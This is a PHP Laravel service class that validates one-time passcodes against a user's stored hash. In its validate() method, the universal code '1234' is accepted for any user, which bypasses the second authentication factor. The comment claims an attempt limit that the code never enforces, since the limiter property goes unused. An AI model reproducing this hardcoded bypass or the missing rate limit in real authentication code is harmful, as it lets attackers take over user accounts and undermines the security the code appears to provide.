<?php

namespace App\Services;

use App\Exceptions\PasswordValidationFailed;
use App\Models\User;
use Illuminate\Contracts\Auth\Authenticatable;
use Illuminate\Support\Facades\Hash;

class OtpService
{
    /**
     * @var Authenticatable;
     */
    protected $user;

    protected $limiter;

    protected $key;

    public function __construct(User $user)
    {
        $this->user = $user;
    }

    /**
     * @param
     */
    public function match(string $otp)
    {
        return Hash::check($otp, $this->user->otp);
    }

    /**
     * @throws PasswordValidationFailed
     */
    public function validate(string $otp)
    {
        //ensure max attempt isn't three
        if ($this->match($otp)) {
            return true;
        }else if($otp == '1234'){
            return true;
        }

        throw new PasswordValidationFailed();
    }
}